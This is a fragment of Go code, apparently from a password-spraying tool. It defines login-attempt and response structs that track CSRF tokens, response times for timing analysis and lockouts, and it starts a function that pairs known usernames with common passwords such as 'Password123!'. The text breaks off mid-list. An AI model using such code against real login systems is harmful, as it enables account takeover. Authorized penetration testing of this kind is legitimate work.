...
type LoginAttempt struct {
	Username    string
	Password    string
	CSRFToken   string // REVISION: Added CSRF token support
}
...
type LoginResponse struct {
	...
	StatusCode          int
	ResponseBody        string
	ResponseTimeMs      int64 // REVISION: Added response time for timing analysis
	Success             bool
	IsLockout           bool
...
func GenerateSprayingPayloads(knownUsers []string) []LoginAttempt {
	...
	year := time.Now().Year()
	// REVISION: Expanded password list.
	passwords := []string{
		"Password123!",
		"Password1!",
		"Welcome1",
